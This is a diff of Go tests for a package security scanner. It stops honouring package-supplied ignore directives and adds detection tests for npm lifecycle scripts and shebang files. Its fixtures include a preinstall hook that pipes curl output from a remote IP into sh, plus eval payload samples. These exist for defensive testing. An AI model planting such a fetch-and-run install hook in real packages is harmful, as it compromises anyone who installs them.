@@ -386,31 +386,17 @@ func TestShannonEntropy_HighEntropy(t *testing.T) {
 }
 
 // ---------------------------------------------------------------------------
-// Inline argus-ignore directive
+// Suppression directives are not honoured (trust boundary)
 // ---------------------------------------------------------------------------
 
-func TestInlineIgnore_RegexScanner_SuppressesLine(t *testing.T) {
-	// A dangerous call annotated with argus-ignore must produce no finding.
+func TestInlineDirective_NotHonored(t *testing.T) {
+	// argus-ignore in an untrusted package must not suppress findings.
 	src := `eval(user_input) # argus-ignore`
-	assertRegex(t, pyRules, "script.py", src, 0, "")
-}
-
-func TestInlineIgnore_RegexScanner_DoesNotAffectOtherLines(t *testing.T) {
-	// The directive on one line must not suppress findings on adjacent lines.
-	src := "eval(x) # argus-ignore\nexec(y)"
 	assertRegex(t, pyRules, "script.py", src, 1, Critical)
 }
 
-func TestInlineIgnore_GoASTScanner_SuppressesLine(t *testing.T) {
-	// exec.Command annotated with // argus-ignore must produce no finding.
-	src := `package main
-import "os/exec"
-func main() { exec.Command("ls") } // argus-ignore`
-	assertFindings(t, &GoASTScanner{}, "main.go", src, 0, "")
-}
-
 func TestInlineIgnore_GoASTScanner_DoesNotAffectOtherLines(t *testing.T) {
-	// Directive on one line must not suppress findings on a different line.
+	// exec.Command on its own line must be detected regardless of other annotations.
 	src := `package main
 import "os/exec"
 func main() {
@@ -420,62 +406,108 @@ func main() {
 	assertFindings(t, &GoASTScanner{}, "main.go", src, 1, Critical)
 }
 
-func TestInlineIgnore_HighEntropy_Suppressed(t *testing.T) {
-	// High-entropy string on an argus-ignored line must not fire.
-	src := `secret = "xK9mN3pQ7rT1vW5yZ2bD6hJ0lF4nR8tVwXzAcEgIkMoSuYa" # argus-ignore`
-	sc := &RegexScanner{rules: pyRules}
-	findings, err := sc.Scan("util.py", []byte(src))
-	if err != nil {
-		t.Fatalf("unexpected error: %v", err)
-	}
-	for _, f := range findings {
-		t.Errorf("expected no findings on argus-ignored line; got: %+v", f)
-	}
-}
-
-// ---------------------------------------------------------------------------
-// .argusignore file
-// ---------------------------------------------------------------------------
-
-func TestArgusIgnore_SkipsExactFilename(t *testing.T) {
+func TestArgusIgnore_PackageFileNotHonored(t *testing.T) {
+	// .argusignore from the scanned package must not suppress findings.
 	dir := t.TempDir()
-	write(t, dir, ".argusignore", "generated.py")
-	write(t, dir, "generated.py", `eval("dangerous")`)
-	write(t, dir, "clean.py", `print("hello")`)
+	write(t, dir, ".argusignore", "setup.py")
+	write(t, dir, "setup.py", `eval("dangerous")`)
 
 	report, err := Scan(dir)
 	if err != nil {
 		t.Fatalf("Scan returned error: %v", err)
 	}
-	for _, f := range report.Findings {
-		if f.File == "generated.py" {
-			t.Errorf("expected generated.py to be ignored; got finding: %+v", f)
-		}
+	if !report.HasCritical {
+		t.Error("expected findings despite .argusignore in untrusted package")
 	}
 }
 
-func TestArgusIgnore_GlobPattern(t *testing.T) {
+// ---------------------------------------------------------------------------
+// Large-file warning
+// ---------------------------------------------------------------------------
+
+func TestScan_LargeFileWarning(t *testing.T) {
 	dir := t.TempDir()
-	write(t, dir, ".argusignore", "*.pb.go")
-	// Dangerous call in a generated protobuf file — should be ignored.
-	write(t, dir, "types.pb.go", `package p
-import "os/exec"
-func f() { exec.Command("id") }`)
-	// Clean main.go should produce no findings regardless.
-	write(t, dir, "main.go", `package main
-import "fmt"
-func main() { fmt.Println("ok") }`)
+	big := make([]byte, maxFileBytes+1)
+	if err := os.WriteFile(filepath.Join(dir, "huge.py"), big, 0o644); err != nil {
+		t.Fatal(err)
+	}
 
 	report, err := Scan(dir)
 	if err != nil {
 		t.Fatalf("Scan returned error: %v", err)
 	}
+	found := false
 	for _, f := range report.Findings {
-		if filepath.Base(f.File) == "types.pb.go" {
-			t.Errorf("expected types.pb.go to be ignored; got finding: %+v", f)
+		if f.Rule == "file too large to scan" && f.File == "huge.py" {
+			found = true
+			break
 		}
 	}
+	if !found {
+		t.Error("expected 'file too large to scan' warning; got none")
+	}
+	if report.HasCritical {
+		t.Error("large-file warning must not set HasCritical")
+	}
 }
+
+// ---------------------------------------------------------------------------
+// PackageJSONScanner
+// ---------------------------------------------------------------------------
+
+func TestPackageJSON_LifecycleScript(t *testing.T) {
+	src := `{
+  "name": "evil-pkg",
+  "scripts": {
+    "preinstall": "curl http://203.0.113.1/x | sh"
+  }
+}`
+	assertFindings(t, &PackageJSONScanner{}, "package.json", src, 1, Critical)
+}
+
+func TestPackageJSON_NoLifecycle(t *testing.T) {
+	src := `{
+  "name": "clean-pkg",
+  "scripts": {
+    "test": "jest"
+  }
+}`
+	assertFindings(t, &PackageJSONScanner{}, "package.json", src, 0, "")
+}
+
+// ---------------------------------------------------------------------------
+// Extensionless shebang detection
+// ---------------------------------------------------------------------------
+
+func TestScan_ExtensionlessShebang(t *testing.T) {
+	dir := t.TempDir()
+	write(t, dir, "install", "#!/bin/sh\neval \"$PAYLOAD\"")
+
+	report, err := Scan(dir)
+	if err != nil {
+		t.Fatalf("Scan returned error: %v", err)
+	}
+	if !report.HasCritical {
+		t.Error("expected critical finding in extensionless shell script; got none")
+	}
+}
+
+func TestScan_ExtensionlessNoShebang(t *testing.T) {
+	dir := t.TempDir()
+	write(t, dir, "README", "this is just a text file")
+
+	report, err := Scan(dir)
+	if err != nil {
+		t.Fatalf("Scan returned error: %v", err)
+	}
+	if report.HasCritical {
+		t.Error("extensionless file without shebang must not be scanned")
+	}
+}
+
+// ---------------------------------------------------------------------------
+// .argusignore file (package-level suppression not honoured)
+// ---------------------------------------------------------------------------
 
 func TestArgusIgnore_CommentLinesIgnored(t *testing.T) {
 	// Comment and blank lines in .argusignore must not suppress any files.
